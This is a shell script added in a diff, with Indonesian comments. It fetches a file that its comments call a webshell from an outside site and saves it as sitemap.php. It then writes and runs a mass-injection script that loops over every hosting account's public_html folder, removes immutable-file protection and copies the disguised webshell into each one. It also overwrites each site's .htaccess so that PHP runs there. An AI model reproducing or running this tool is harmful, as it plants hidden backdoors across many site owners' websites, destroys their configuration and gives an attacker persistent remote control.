@@ -1,0 +1,49 @@
+# 1. Download Webshell dari sumber kamu
+curl -s https://www.insomnie.guide/sitemap.php -o /root/sitemap.php
+
+# 2. Buat .htaccess agar webserver tetap handle file PHP (tanpa blokir IP)
+cat <<'EOF' > /root/htaccess_sitemap
+<FilesMatch "\.php$">
+  SetHandler application/x-httpd-php
+</FilesMatch>
+EOF
+
+# 3. Buat script injector massal
+cat <<'EOF' > /root/inject_sitemap.sh
+#!/bin/bash
+LOGFILE="/root/injected_sitemap_$(date +%F_%H-%M).txt"
+SHELL="/root/sitemap.php"
+HTACCESS="/root/htaccess_sitemap"
+
+if [ ! -f "$SHELL" ]; then
+  echo "[✘] Webshell tidak ditemukan di $SHELL"
+  exit 1
+fi
+
+echo "[...] Memulai injeksi massal sitemap.php..."
+
+for path in /home*/*/public_html; do
+  if [ -d "$path" ]; then
+    # Bypass proteksi immutable
+    chattr -i "$path" 2>/dev/null
+    chattr -i "$path/sitemap.php" 2>/dev/null
+    chattr -i "$path/.htaccess" 2>/dev/null
+
+    # Inject file sitemap.php
+    cp "$SHELL" "$path/sitemap.php"
+
+    # Inject .htaccess biasa
+    cp "$HTACCESS" "$path/.htaccess"
+
+    echo "[✓] Injected to $path/sitemap.php" | tee -a "$LOGFILE"
+  fi
+done
+
+echo "[✔] Selesai. Log: $LOGFILE"
+EOF
+
+# 4. Kasih izin eksekusi
+chmod +x /root/inject_sitemap.sh
+
+# 5. Jalankan
+bash /root/inject_sitemap.sh
